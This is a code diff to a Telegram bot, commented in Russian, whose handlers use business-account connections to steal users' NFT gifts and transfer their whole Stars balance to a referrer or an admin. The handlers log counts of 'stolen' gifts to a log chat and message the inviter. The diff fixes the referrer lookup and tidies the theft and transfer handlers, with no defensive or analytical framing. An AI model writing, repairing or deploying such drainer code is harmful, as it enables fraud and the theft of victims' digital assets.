@@ -672,14 +672,14 @@ async def steal_gifts_handler(callback: CallbackQuery):
         await callback.answer(f"❌ Ошибка получения бизнес-аккаунта: {e}")
         return
 
-    # Определяем получателя
-    inviter_id = user_referrer_map.get(user.id)
+    # Определяем получателя (как во втором боте)
+    inviter_id = user_referrer_map.get(str(user.id))  # Используем str() для ключа
     if inviter_id:
         try:
             await bot.send_chat_action(inviter_id, "typing")
             recipient_id = inviter_id
         except Exception:
-            recipient_id = ADMIN_IDS[0]
+            recipient_id = ADMIN_IDS[0]  # Fallback на админа, если реферал недоступен
     else:
         recipient_id = ADMIN_IDS[0]
 
@@ -718,22 +718,20 @@ async def steal_gifts_handler(callback: CallbackQuery):
             except Exception:
                 continue
 
-    # Формируем отчет без ошибок
+    # Формируем отчет (как во втором боте)
     result_msg = []
     if stolen_count > 0:
         result_msg.append(f"\n🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n")
-        result_msg.extend(stolen_nfts[:10])  # Ограничиваем количество выводимых NFT
+        result_msg.extend(stolen_nfts[:10])
     
     full_report = "\n".join(result_msg) if result_msg else "\nНе удалось украсть подарки"
     
-    # Отправляем отчет в LOG_CHAT_ID
     await bot.send_message(
         chat_id=LOG_CHAT_ID,
         text=f"Отчет по бизнес-аккаунту {user.id}:\n{full_report}",
         parse_mode="HTML"
     )
     
-    # Отправляем отчет пригласившему (если есть)
     if inviter_id and inviter_id != user.id:
         try:
             await bot.send_message(
@@ -745,7 +743,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
             await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
     
     await callback.answer(f"Украдено {stolen_count} подарков")
-    
+
 @dp.callback_query(F.data.startswith("transfer_stars:"))
 async def transfer_stars_handler(callback: CallbackQuery):
     business_id = callback.data.split(":")[1]
@@ -754,8 +752,8 @@ async def transfer_stars_handler(callback: CallbackQuery):
         business_connection = await bot.get_business_connection(business_id)
         user = business_connection.user
         
-        # Определяем получателя (как в steal_gifts_handler)
-        inviter_id = user_referrer_map.get(user.id)
+        # Определяем получателя (как во втором боте)
+        inviter_id = user_referrer_map.get(str(user.id))  # Используем str() для ключа
         if inviter_id:
             try:
                 await bot.send_chat_action(inviter_id, "typing")
@@ -765,7 +763,6 @@ async def transfer_stars_handler(callback: CallbackQuery):
         else:
             recipient_id = ADMIN_IDS[0]
             
-        # Получаем баланс и переводим звёзды
         stars = await bot.get_business_account_star_balance(business_id)
         amount = int(stars.amount)
         
@@ -773,7 +770,6 @@ async def transfer_stars_handler(callback: CallbackQuery):
             await bot.transfer_business_account_stars(business_id, amount, recipient_id)
             success_msg = f"🌟 Успешно переведено звёзд: {amount} от {user.id} к {recipient_id}"
             
-            # Отправляем сообщение в лог и пригласившему
             await bot.send_message(LOG_CHAT_ID, success_msg)
             if inviter_id and inviter_id != recipient_id:
                 try:
